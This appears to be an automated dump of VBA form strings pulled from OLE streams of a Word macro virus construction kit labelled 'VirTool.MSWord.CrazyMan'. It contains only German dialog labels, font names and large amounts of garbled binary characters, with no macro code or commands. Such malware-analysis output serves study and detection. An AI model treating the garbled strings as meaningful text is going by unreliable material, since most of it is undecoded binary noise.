VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Find ich auch.R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FaszinierendN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  Abbruchme.�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   OK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1:100
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1:200
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1:500
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1:1000@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormGenerator/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  Abbruch
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   OK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormHyperLink/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  Abbruchme.�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   OK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Suche ganzes Wort C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Orginal Text:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ersetzen durch:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormReplace/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   OK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  Abbruch
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nach Datumo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nach Zufall
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormStartOptionen/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   OK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  Abbruch
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Testen ...o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormTextBox/i08/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
